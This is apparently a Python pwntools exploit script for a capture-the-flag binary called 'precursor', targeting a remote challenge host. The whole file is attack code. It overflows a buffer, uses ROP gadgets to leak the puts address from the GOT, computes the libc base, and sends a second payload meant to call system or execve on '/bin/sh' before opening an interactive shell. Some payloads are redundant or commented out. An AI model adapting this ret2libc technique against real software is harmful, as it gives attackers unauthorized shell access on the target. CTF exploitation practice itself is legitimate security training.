## NX Enabled , using ROP to bypass
## sol:  Call system('/bin/sh')
from pwn import *
from Crypto.Util.number import bytes_to_long
debug = True

context.binary = './precursor'
context.log_level = 'debug'
binary = ELF('./precursor')

if debug:
    r = process('./precursor')
    libc = binary.libc

else:
    r = remote('chal.firebird.sh',35031)
    libc = ELF('libc6_2.23-0ubuntu11.3_amd64.so')


# Using ROPgadget
pop_rdi = 0x40126b
start = 0x401060
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
one_link_only = binary.sym['one_link_only'] # 0x401142


offset = 24

payload_1 = flat(
    b'A' * offset,
    pop_rdi
)
payload_2 = flat(
    puts_got,
    puts_plt,
    start,
)
r.recvuntil('...\n')
r.send(payload_2)
r.recvuntil('!\n')
r.send(payload_1)


# r.sendafter('good luck...\n', p64(0) +p64(puts_got) + p64(puts_plt) + p64(start))

# r.sendafter('Ill only let you have one link!\n', b'b'*0x10 + p64(0x404900) + p64(0x401142))
# r.sendafter('Ill only let you have one link!\n', b'v' * 0x18 + p64(pop_rdi))

puts_leak = r.recvline().strip()

puts_leak = bytes_to_long(puts_leak[::-1])
print(hex(puts_leak))

libc.address = puts_leak - libc.sym['puts']
bin_sh = next(libc.search(b'/bin/sh\x00'))

## Consturct ROPgadget
system = libc.sym['system']
exec_add = libc.sym['execve']
payload_2 = flat(
    p64(0),
    bin_sh,
    system
)

r.sendafter('good luck...\n',  p64(bin_sh) + p64(exec_add))

#r.sendafter('Ill only let you have one link!\n', b'b'*0x10 + p64(0x404900) + p64(0x401142))
r.sendafter('Ill only let you have one link!\n', b'v' * 0x18 + p64(pop_rdi))
r.clean()
r.interactive()

